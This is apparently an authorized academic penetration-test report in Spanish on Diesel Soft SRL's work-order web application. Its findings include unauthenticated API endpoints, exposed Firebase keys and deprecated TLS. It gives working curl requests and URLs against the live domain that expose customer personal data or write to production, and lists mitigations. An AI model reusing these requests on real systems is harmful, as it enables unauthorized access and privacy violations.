# Análisis de Vulnerabilidades — Aplicación Web Órdenes de Trabajo
## Diesel Soft SRL · Basado en OWASP Top 10

**Autor:** Rimer Saul Rosa Herrera  
**Institución:** Universidad Mayor de San Simón (UMSS) — EUPG, Facultad de Ciencias y Tecnología  
**Programa:** Diplomado en Ciberseguridad  
**Fecha:** Julio 2026  
**Dominio analizado:** `wo.dieselsoft.co`  
**Metodología:** Caja Gris (Gray Box Testing) · DAST  
**Marco de referencia:** OWASP Top 10 (2021) · OWASP Testing Guide v4.2 · CVSS v3.1  

---

## Resumen

Análisis dinámico de seguridad (DAST) sobre la aplicación web de Órdenes de Trabajo de Diesel Soft SRL, ejecutado con autorización explícita de la empresa desde el dominio público `wo.dieselsoft.co`. Se identificaron **8 vulnerabilidades activas** (5 explotadas con evidencia real), siendo la más crítica la ausencia total de autenticación en el backend `/inv-api` (CVSS 9.9). Se proponen 6 mitigaciones técnicas que eliminan el 100% de los riesgos en aproximadamente 9 días de desarrollo.

---

## Índice

1. [Entorno de trabajo](#entorno-de-trabajo)
2. [Herramientas utilizadas](#herramientas-utilizadas)
3. [Fase 1 — Reconocimiento Pasivo](#fase-1--reconocimiento-pasivo)
4. [Fase 2 — Enumeración Activa](#fase-2--enumeración-activa)
5. [Fase 3 — Identificación de Vulnerabilidades](#fase-3--identificación-de-vulnerabilidades)
6. [Fase 4 — Validación y Explotación](#fase-4--validación-y-explotación)
7. [Fase 5 — Documentación y Clasificación](#fase-5--documentación-y-clasificación)
8. [Vulnerabilidades Identificadas](#vulnerabilidades-identificadas)
9. [Mitigaciones Propuestas](#mitigaciones-propuestas)
10. [Plan de Implementación](#plan-de-implementación)
11. [Referencias](#referencias)

---

## Entorno de Trabajo

| Parámetro | Valor |
|---|---|
| Sistema operativo | Kali Linux |
| Objetivo | `https://wo.dieselsoft.co` |
| IP del servidor | `159.89.139.254` |
| Tipo de análisis | Caja Gris (Gray Box) — DAST |
| Autorización | Explícita de Diesel Soft SRL |
| Backend analizado | `/api`, `/auth-api`, `/inv-api` |
| Stack tecnológico | React · React Router · Tailwind CSS · nginx · FastAPI/Python · Firebase |

---

## Herramientas Utilizadas

| Herramienta | Versión/Fuente | Uso |
|---|---|---|
| **Kali Linux** | OffSec 2024 | Sistema operativo base |
| **curl** | Nativo Linux | Solicitudes HTTP, verificación de headers y endpoints |
| **Katana** | ProjectDiscovery | Crawling inteligente de URLs y análisis de JavaScript |
| **Gobuster** | OJ/gobuster | Fuzzing de directorios y rutas ocultas |
| **whatweb** | Nativo Kali | Identificación de tecnologías (bloqueado por Cloudflare) |
| **Wappalyzer** | Extensión navegador | Identificación de stack tecnológico frontend |
| **openssl** | Nativo Linux | Análisis de protocolos TLS y certificados SSL |
| **Python 3** | PSF | Scripting y procesamiento de datos |
| **Postman** | Postman Inc. | Exploración de endpoints de la API |
| **ZAP** | OWASP | Scanner automático de vulnerabilidades web |
| **nmap** | Gordon Lyon | Escaneo de puertos y servicios |
| **Navegador web** | Chrome/Firefox | Acceso manual, Wappalyzer, DevTools |

### Instalación de Katana

```bash
# Verificar Go instalado
go version

# Instalar Go si no está
apt install golang -y

# Instalar Katana
go install github.com/projectdiscovery/katana/cmd/katana@latest

# Agregar al PATH (temporal)
export PATH=$PATH:~/go/bin

# Agregar al PATH (permanente)
echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc && source ~/.bashrc

# Verificar instalación
katana -version
```

---

## Fase 1 — Reconocimiento Pasivo

Recopilación de información sin interactuar directamente con la aplicación.

### 1.1 Resolución DNS (who.is / RDAP)

**Objetivo:** Identificar la IP real del servidor detrás del proxy Cloudflare.

**Herramienta:** Navegador web → `https://who.is`  
**Acción:** Ingresar `dieselsoft.co` en el campo de búsqueda RDAP

**Resultado:**
```
IP real del servidor: 159.89.139.254
Proveedor: DigitalOcean
País: United States
```

> **Hallazgo:** Cloudflare no garantiza anonimato total si el dominio raíz no está protegido. La IP real es públicamente accesible desde cualquier navegador sin herramientas especializadas.

---

### 1.2 Identificación de Tecnologías (Wappalyzer)

**Objetivo:** Identificar el stack tecnológico del frontend.

**Herramienta:** Wappalyzer (extensión de navegador)  
**URL analizada:** `https://wo.dieselsoft.co/login`

> **Nota:** `whatweb` fue bloqueado por Cloudflare con error 530, por lo que se utilizó Wappalyzer desde el navegador.

**Resultado:**

| Tecnología | Categoría |
|---|---|
| React | Framework JavaScript |
| React Router | Enrutamiento SPA |
| Tailwind CSS | Framework CSS |
| nginx | Servidor web |

> **Hallazgo:** Aplicación SPA (Single Page Application) construida en React. Toda la lógica de navegación se ejecuta en el cliente, lo que implica que las rutas de la API están embebidas en el bundle JavaScript.

---

### 1.3 Análisis SSL/TLS (curl)

**Objetivo:** Verificar la validez del certificado SSL y la configuración de cifrado.

**Herramienta:** `curl` | **Sistema:** Kali Linux

```bash
curl -v https://wo.dieselsoft.co/ 2>&1 | grep -A 10 "* Server certificate"
```

**Resultado:**

| Campo | Valor |
|---|---|
| Emisor | Google Trust Services |
| Algoritmo | EC (Curva Elíptica) |
| Estado | Válido y vigente |
| Cifrado | TLS 1.3 (conexión normal) |

> **Hallazgo:** Certificado SSL válido y moderno. Las comunicaciones están correctamente cifradas en condiciones normales. Sin embargo, el servidor también acepta protocolos deprecados (ver V6).

---

## Fase 2 — Enumeración Activa

Exploración directa de la aplicación para descubrir rutas, endpoints y superficie de ataque.

### 2.1 Rastreo con Katana

**Objetivo:** Descubrir todas las rutas y URLs de la aplicación, incluyendo recursos JavaScript dinámicos.

**Herramienta:** Katana | **Sistema:** Kali Linux

```bash
katana -u https://wo.dieselsoft.co -d 3 -jc -timeout 10 -rate-limit 100
```

**Parámetros:**

| Parámetro | Valor | Descripción |
|---|---|---|
| `-u` | `https://wo.dieselsoft.co` | URL objetivo |
| `-d` | `3` | Profundidad máxima de rastreo (3 niveles) |
| `-jc` | — | JavaScript crawling (ejecuta JS para URLs dinámicas) |
| `-timeout` | `10` | Tiempo máximo por solicitud (segundos) |
| `-rate-limit` | `100` | Máximo 100 solicitudes por segundo |

**Resultado:** 97 URLs descubiertas, incluyendo:

```
https://wo.dieselsoft.co/assets/index-BMwkIzXx.js     ← Bundle JS principal
https://wo.dieselsoft.co/assets/index.es-CMPtnVZd.js
https://wo.dieselsoft.co/inv-api/openapi.json          ← HALLAZGO CRÍTICO
https://wo.dieselsoft.co/inv-api/docs
https://wo.dieselsoft.co/inv-api/redoc
https://wo.dieselsoft.co/inv-api/health
```

> **Hallazgo crítico:** Katana identificó el archivo `/inv-api/openapi.json` accesible sin autenticación. Este archivo es la especificación técnica completa de la API: lista todos los endpoints, métodos HTTP, parámetros y esquemas de autenticación. Es el mapa completo del backend.

---

### 2.2 Inspección del Bundle JavaScript

**Objetivo:** Identificar los backends del sistema desde el código fuente compilado.

**Herramienta:** Navegador web (DevTools)  
**Archivo:** `https://wo.dieselsoft.co/assets/index-BMwkIzXx.js`

Se buscó el término `apiKey` y constantes de rutas en el código minificado. Se encontraron las siguientes constantes:

```javascript
const NY = "/api"
const CY = "/auth-api/users"
const TY = "/inv-api"           // TY es el nombre que el minificador asignó a INVENTORY_API
const OY = 3e4                  // timeout = 30000ms
const Jy = "ViJKnOKl4KbDfgeR9cdb"   // ← branch_id hardcodeado
const PY = "work_order"
```

> **Nota sobre el minificado:** El compilador de React reemplaza nombres legibles como `INVENTORY_API_URL` por abreviaciones de 2 letras (`TY`) para reducir el tamaño del archivo. El valor `/inv-api` es lo que importa, no el nombre de la variable.

---

### 2.3 Fuzzing con Gobuster

**Objetivo:** Descubrir rutas activas dentro del backend `/inv-api`.

**Herramienta:** Gobuster | **Sistema:** Kali Linux

```bash
gobuster dir \
  -u https://wo.dieselsoft.co/inv-api \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 \
  --exclude-length 1223,1070
```

**Parámetros:**

| Parámetro | Descripción |
|---|---|
| `dir` | Modo fuzzing de directorios |
| `-u` | URL objetivo |
| `-w` | Wordlist (220,558 rutas) |
| `-t 50` | 50 hilos concurrentes |
| `--exclude-length` | Excluir respuestas de longitud 1223 y 1070 (páginas de error) |

**Resultado:**

```
/docs     (Status: 200) [Size: 1305]   ← Documentación Swagger
/health   (Status: 200) [Size: 109]    ← Health check
/redoc    (Status: 200) [Size: 1265]   ← Documentación ReDoc
```

---

## Fase 3 — Identificación de Vulnerabilidades

### 3.1 Verificación de Autenticación en Endpoints

```bash
# Verificar endpoint sin token
curl -s "https://wo.dieselsoft.co/inv-api/api/product/products" \
  -H "User-Agent: Mozilla/5.0"

# Resultado: datos devueltos sin autenticación → VULNERABLE
```

### 3.2 Análisis de Headers de Seguridad HTTP

```bash
curl -s -I "https://wo.dieselsoft.co/" \
  -H "User-Agent: Mozilla/5.0"
```

**Headers de seguridad AUSENTES:**

| Header | Riesgo sin él |
|---|---|
| `Strict-Transport-Security` | No obliga HTTPS al navegador |
| `X-Frame-Options` | Permite carga en iframes (clickjacking) |
| `X-Content-Type-Options` | Permite MIME sniffing |
| `Content-Security-Policy` | Sin restricción de scripts (riesgo XSS) |
| `Permissions-Policy` | Sin control de cámara/micrófono |

### 3.3 Verificación de Protocolos TLS

```bash
# Verificar soporte de TLS 1.0 (deprecado)
openssl s_client -connect wo.dieselsoft.co:443 -tls1 < /dev/null 2>&1 | grep Protocol

# Verificar soporte de TLS 1.1 (deprecado)
openssl s_client -connect wo.dieselsoft.co:443 -tls1_1 < /dev/null 2>&1 | grep Protocol
```

**Resultado:**
```
Protocol: TLSv1    ← CONECTADO — protocolo deprecado ACEPTADO
Protocol: TLSv1.1  ← CONECTADO — protocolo deprecado ACEPTADO
```

### 3.4 Verificación de Rate Limiting

```bash
for i in {1..20}; do
  curl -s -o /dev/null -w "Request $i: %{http_code}\n" \
    "https://wo.dieselsoft.co/inv-api/api/category/" \
    -H "User-Agent: Mozilla/5.0"
done
```

**Resultado:** Todas las 20 solicitudes → `HTTP 200` sin ningún bloqueo ni limitación.

### 3.5 Verificación de Endpoint Debug

```bash
curl -s -I "https://wo.dieselsoft.co/inv-api/api/sale/debug-register" \
  -H "User-Agent: Mozilla/5.0" \
  -X POST
```

**Resultado:** `HTTP/2 200` — endpoint activo en producción sin autenticación.

### 3.6 Identificación de Credenciales Firebase

Se inspeccionó el bundle JS con `Ctrl+F` buscando `apiKey`:

```javascript
// Credenciales encontradas hardcodeadas en bundle público:
apiKey:            "AIzaSyCG_Y4Heup1vPRYOYfXeN8OL7lF-T91wB4"
authDomain:        "w-o-ds.firebaseapp.com"
projectId:         "w-o-ds"
storageBucket:     "w-o-ds.firebasestorage.app"
messagingSenderId: "317020473872"
appId:             "1:317020473872:web:72d4a039736fe3350e5895"
```

---

## Fase 4 — Validación y Explotación

Todas las explotaciones se ejecutaron con **autorización explícita de Diesel Soft SRL** en el entorno de producción.

### Explotación 1 — Enumeración de Productos (V1)

```bash
# Paso 1: Obtener branch_id desde endpoint de pasillos
curl -s "https://wo.dieselsoft.co/inv-api/api/aisle/" \
  -H "User-Agent: Mozilla/5.0"
# Resultado: {"name":"P1","branch_id":"ViJKnOKl4KbDfgeR9cdb",...}

# Paso 2: Acceder al catálogo completo sin autenticación
# Desde navegador:
# https://wo.dieselsoft.co/inv-api/api/product/products?branch_id=ViJKnOKl4KbDfgeR9cdb
```

**Resultado:** **554 productos** expuestos con nombre, precio, cantidad, stock, código, ubicación física (pasillo/columna/fila) e imágenes.

---

### Explotación 2 — Datos de Ventas (V1)

```bash
# Desde navegador (sin token):
# https://wo.dieselsoft.co/inv-api/api/sale/
```

**Resultado:** **167 registros de ventas** con nombres completos, cédulas de identidad y teléfonos de clientes y empleados.

---

### Explotación 3 — Órdenes de Trabajo (V1 + V2)

```bash
# Desde navegador (sin token):
# https://wo.dieselsoft.co/inv-api/api/work-orders/
```

**Resultado:** **50 órdenes de trabajo** con nombres de clientes, matrículas de vehículos, números de chasis y URLs de PDFs con expiración en el **año 2491**.

---

### Explotación 4 — Inserción de Datos Falsos (V1)

```bash
curl -s -X POST "https://wo.dieselsoft.co/inv-api/api/category/register" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0" \
  -d '{"name":"PRUEBA SEGURIDAD"}'
```

**Resultado:**
```json
{
  "name": "PRUEBA SEGURIDAD",
  "state_control": true,
  "category_id": "h0uXP3yUcsIMdPHWq15F"
}
```

Categoría creada exitosamente en la base de datos de producción **sin ningún token de autenticación**.

---

### Explotación 5 — Firebase Storage (V3 + V4)

Se accedió a las URLs de Firebase Storage encontradas en las respuestas de la API directamente desde el navegador sin ninguna credencial, descargando archivos (imágenes, PDFs) del bucket del proyecto `w-o-ds.firebasestorage.app`.

---

## Fase 5 — Documentación y Clasificación

### Resumen de Vulnerabilidades

| ID | Vulnerabilidad | OWASP | CVSS | Severidad | Estado |
|---|---|---|---|---|---|
| **V1** | Backend `/inv-api` sin autenticación (76+ endpoints) | A01/A07 | **9.9** | 🔴 CRÍTICA | Explotada |
| **V2** | PDFs con URLs permanentes (expiración año 2491) | A01/A02 | **8.1** | 🟠 ALTA | Explotada |
| **V3** | Credenciales Firebase en bundle JS público | A02 | **7.5** | 🟠 ALTA | Verificada |
| **V4** | Firebase Storage accesible sin autenticación | A02 | **7.5** | 🟠 ALTA | Explotada |
| **V5** | Ausencia de rate limiting (riesgo DoS) | A04 | **7.5** | 🟠 ALTA | Verificada |
| **V6** | TLS 1.0 y TLS 1.1 deprecados activos | A02 | **6.5** | 🟡 MEDIA | Verificada |
| **V7** | Headers de seguridad HTTP faltantes (5 headers) | A05 | **5.3** | 🟡 MEDIA | Verificada |
| **V8** | Debug/Swagger activos en producción | A05/A09 | **5.3** | 🟡 MEDIA | Verificada |

### Impacto sobre la Tríada CIA

| Vulnerabilidad | Confidencialidad | Integridad | Disponibilidad |
|---|---|---|---|
| V1 | ✗ Comprometida | ✗ Comprometida | ✗ Comprometida |
| V2 | ✗ Comprometida | — | — |
| V3 | ✗ Comprometida | — | — |
| V4 | ✗ Comprometida | — | — |
| V5 | — | — | ✗ En riesgo |
| V6 | ✗ En riesgo | — | — |
| V7 | — | — | — |
| V8 | ✗ En riesgo | — | — |

---

## Vulnerabilidades Identificadas

### V1 — Backend /inv-api sin Autenticación (CVSS 9.9)

**Descripción:** El backend `/inv-api` construido con FastAPI/Python expone más de 76 endpoints completamente sin autenticación. Cualquier persona en internet puede leer, crear, modificar y eliminar datos del sistema sin credenciales.

**Cómo se descubrió:**
1. Katana descubrió `/inv-api/openapi.json` durante el crawling
2. El archivo openapi.json documentó públicamente 87 endpoints sin campo `security`
3. Gobuster confirmó las rutas activas `/docs`, `/health`, `/redoc`
4. Inspección del bundle JS reveló los 3 backends: `/api`, `/auth-api`, `/inv-api`

**Comandos usados:**
```bash
katana -u https://wo.dieselsoft.co -d 3 -jc -timeout 10 -rate-limit 100
gobuster dir -u https://wo.dieselsoft.co/inv-api -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --exclude-length 1223,1070
curl -s "https://wo.dieselsoft.co/inv-api/api/product/products?branch_id=ViJKnOKl4KbDfgeR9cdb"
```

---

### V2 — PDFs con URLs Permanentes (CVSS 8.1)

**Descripción:** Las respuestas del endpoint `/inv-api/api/work-orders/` incluyen URLs firmadas de Google Cloud Storage con parámetro `Expires=16447032000` (año 2491), accesibles sin autenticación.

**Cómo se descubrió:** Durante el análisis del openapi.json se identificó el endpoint de órdenes de trabajo. Las respuestas JSON incluían el campo `urlFile` con URLs permanentes de Firebase Storage.

---

### V3 — Credenciales Firebase Expuestas (CVSS 7.5)

**Descripción:** El bundle JavaScript público contiene la configuración completa de Firebase en texto plano, incluyendo `apiKey`, `projectId`, `storageBucket` y `appId`.

**Cómo se descubrió:** Inspección manual del archivo `index-BMwkIzXx.js` con búsqueda de `apiKey` en el navegador.

---

### V4 — Firebase Storage Público (CVSS 7.5)

**Descripción:** Las reglas de Firebase Storage permiten lectura pública (`allow read: if true`). Cualquier persona puede descargar archivos del bucket `w-o-ds.firebasestorage.app` sin autenticación.

**Cómo se descubrió:** Con las credenciales encontradas en V3 y las URLs de V2, se accedió directamente a archivos del bucket desde el navegador.

---

### V5 — Sin Rate Limiting (CVSS 7.5)

**Descripción:** Ningún endpoint implementa control de tasa de solicitudes. Un atacante puede enviar miles de solicitudes por segundo sin ser bloqueado.

**Comando de verificación:**
```bash
for i in {1..20}; do
  curl -s -o /dev/null -w "Request $i: %{http_code}\n" \
    "https://wo.dieselsoft.co/inv-api/api/category/" \
    -H "User-Agent: Mozilla/5.0"
done
# Resultado: Todas HTTP 200 sin bloqueo
```

---

### V6 — TLS 1.0 y 1.1 Activos (CVSS 6.5)

**Descripción:** El servidor acepta protocolos TLS 1.0 y TLS 1.1, deprecados oficialmente en 2020 mediante RFC 8996. Un atacante en la red puede forzar una negociación a la baja (downgrade attack).

**Comandos de verificación:**
```bash
openssl s_client -connect wo.dieselsoft.co:443 -tls1 < /dev/null 2>&1 | grep Protocol
# Resultado: Protocol: TLSv1 ← ACEPTADO

openssl s_client -connect wo.dieselsoft.co:443 -tls1_1 < /dev/null 2>&1 | grep Protocol
# Resultado: Protocol: TLSv1.1 ← ACEPTADO
```

---

### V7 — Headers HTTP Faltantes (CVSS 5.3)

**Descripción:** El servidor no implementa ninguno de los 5 headers de seguridad HTTP recomendados por OWASP.

**Comando de verificación:**
```bash
curl -s -I "https://wo.dieselsoft.co/" -H "User-Agent: Mozilla/5.0"
# Ninguno de los 5 headers de seguridad presente en la respuesta
```

---

### V8 — Debug/Swagger en Producción (CVSS 5.3)

**Descripción:** Los endpoints `/inv-api/docs`, `/inv-api/redoc` y `/inv-api/api/sale/debug-register` están activos en producción, exponiendo el mapa completo de la API y funcionalidades de depuración.

**Comando de verificación:**
```bash
curl -s -I "https://wo.dieselsoft.co/inv-api/api/sale/debug-register" \
  -H "User-Agent: Mozilla/5.0" -X POST
# Resultado: HTTP/2 200 — activo sin autenticación
```

---

## Mitigaciones Propuestas

### Mitigación 1 — JWT + RBAC (resuelve V1)

**Estándar:** OWASP A01, NIST AC-3, ISO 27002 9.4

Implementar middleware de verificación JWT en todos los endpoints de `/inv-api`:

```python
# FastAPI — middleware JWT (ejemplo)
from fastapi import Depends, HTTPException, status
from fastapi.security import HTTPBearer

security = HTTPBearer()

async def verify_token(token = Depends(security)):
    try:
        payload = jwt.decode(token.credentials, SECRET_KEY, algorithms=["HS256"])
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expirado")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Token inválido")

# RBAC — solo ADMIN puede eliminar
async def require_admin(payload = Depends(verify_token)):
    if payload.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Se requiere rol administrador")
    return payload
```

**Flujo:**
```
Cliente → Middleware JWT → Token válido → RBAC → Endpoint
                       ↘ Token inválido/ausente → HTTP 401
```

---

### Mitigación 2 — Firebase: URLs Firmadas + Credenciales + Storage (resuelve V2, V3, V4)

**Estándar:** OWASP A02, NIST SC-28

```javascript
// V2: Signed URLs temporales (backend)
const file = bucket.file(fileName);
const [url] = await file.getSignedUrl({
  action: 'read',
  expires: Date.now() + 30 * 60 * 1000  // 30 minutos
});

// V3: Revocar apiKey en Firebase Console
// Restringir nueva key a: wo.dieselsoft.co

// V4: Reglas Firebase Storage
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /{allPaths=**} {
      allow read: if request.auth != null;  // Solo usuarios autenticados
      allow write: if request.auth != null;
    }
  }
}
```

---

### Mitigación 3 — Rate Limiting (resuelve V5)

**Estándar:** OWASP A04, NIST SI-10

```nginx
# nginx.conf
http {
    limit_req_zone $binary_remote_addr zone=api_limit:10m rate=100r/15m;

    server {
        location /inv-api/ {
            limit_req zone=api_limit burst=20 nodelay;
            limit_req_status 429;
        }
    }
}
```

---

### Mitigación 4 — Deshabilitar TLS 1.0 y 1.1 (resuelve V6)

**Estándar:** OWASP A02, NIST SC-8, RFC 8996

```nginx
# nginx.conf
server {
    ssl_protocols TLSv1.2 TLSv1.3;   # Solo versiones seguras
    ssl_prefer_server_ciphers on;
}
```

---

### Mitigación 5 — Headers de Seguridad HTTP (resuelve V7)

**Estándar:** OWASP A05, NIST SI-10

```nginx
# nginx.conf
server {
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
}
```

---

### Mitigación 6 — Deshabilitar Debug/Swagger en Producción (resuelve V8)

**Estándar:** OWASP A05, NIST CM-7

```python
# FastAPI — condicional por entorno
import os

app = FastAPI(
    docs_url="/docs" if os.getenv("NODE_ENV") != "production" else None,
    redoc_url="/redoc" if os.getenv("NODE_ENV") != "production" else None,
)

# Endpoint debug — solo en desarrollo
if os.getenv("NODE_ENV") != "production":
    @app.post("/api/sale/debug-register")
    async def debug_register():
        ...
```

---

## Plan de Implementación

| Prioridad | Vulnerabilidades | CVSS | Tiempo estimado | Acción |
|---|---|---|---|---|
| **P1 — Inmediata** | V1 (JWT + RBAC) | 9.9 | 2–3 días | Middleware JWT global en FastAPI |
| **P2 — Corto plazo** | V2, V3, V4, V5 | 7.5–8.1 | 4 días | Firebase rules + Signed URLs + Rate limiting |
| **P3 — Mediano plazo** | V6, V7, V8 | 5.3–6.5 | 2 días | Configuración nginx (TLS + Headers + Debug) |
| **TOTAL** | **V1 a V8** | — | **~9 días** | **100% vulnerabilidades eliminadas** |

---

## Estructura del Repositorio

```
📁 analisis-vulnerabilidades-dieselsoft/
├── README.md                          ← Este archivo
├── monografia/
│   └── monografia_final.docx          ← Documento completo
├── presentacion/
│   └── presentacion_ciberseguridad.pptx
└── evidencias/
    ├── fase1_reconocimiento/
    │   ├── rdap_who_is.png
    │   ├── wappalyzer_stack.png
    │   └── ssl_certificado.png
    ├── fase2_enumeracion/
    │   ├── katana_urls.png
    │   ├── bundle_js_backends.png
    │   └── openapi_json.png
    ├── fase3_identificacion/
    │   ├── headers_faltantes.png
    │   ├── tls_deprecado.png
    │   └── firebase_credenciales.png
    └── fase4_explotacion/
        ├── 554_productos.png
        ├── 167_ventas.png
        ├── 50_ordenes_trabajo.png
        ├── prueba_seguridad_insertada.png
        └── firebase_storage_acceso.png
```

---

## Declaración Ética

> Este análisis fue realizado **con autorización explícita de Diesel Soft SRL** en el marco del Diplomado en Ciberseguridad de la EUPG-UMSS. Todas las pruebas se ejecutaron sin causar daño operativo permanente. Los datos personales obtenidos durante el análisis fueron tratados con confidencialidad y no fueron divulgados a terceros. El registro de prueba ("PRUEBA SEGURIDAD") insertado en la base de datos fue identificado y comunicado a la empresa para su eliminación.

---

## Referencias

- Lyon, G. F. (2009). *Nmap network scanning*. Nmap Project.
- Stuttard, D. (2011). *The web application hacker's handbook* (2.ª ed.). John Wiley & Sons.
- Stenberg, D. (2023). *Everything curl*. https://everything.curl.dev/
- Weidman, G. (2014). *Penetration testing*. No Starch Press.
- FIRST.Org. (2019). *CVSS v3.1 specification*. https://www.first.org/cvss/v3.1/specification-document
- Joint Task Force. (2020). *NIST SP 800-53 Rev. 5*. https://doi.org/10.6028/NIST.SP.800-53r5
- OWASP Foundation. (2021). *OWASP Top 10:2021*. https://owasp.org/Top10/2021/
- Saad, E. (2020). *OWASP Web Security Testing Guide v4.2*. https://owasp.org/www-project-web-security-testing-guide/v42/
- Jones, M. (2015). *JSON Web Token (JWT)* (RFC 7519). https://www.rfc-editor.org/rfc/rfc7519
- Rescorla, E. (2021). *Deprecating TLS 1.0 and TLS 1.1* (RFC 8996). https://www.rfc-editor.org/rfc/rfc8996
- Bennetts, S. (2010). *ZAP* [Software]. OWASP. https://www.zaproxy.org
- OpenSSL Project. (2023). *OpenSSL* [Software]. https://www.openssl.org
- ProjectDiscovery. (2023). *Katana* [Software]. https://github.com/projectdiscovery/katana
- Reeves, O. J. (2023). *Gobuster* [Software]. https://github.com/OJ/gobuster
- Google LLC. (2023). *Firebase platform documentation*. https://firebase.google.com
- OpenAPI Initiative. (2021). *OpenAPI specification v3.1.0*. https://spec.openapis.org/oas/v3.1.0

---

*Cochabamba, Bolivia · Julio 2026*  
*Rimer Saul Rosa Herrera — Diplomado en Ciberseguridad, EUPG-UMSS*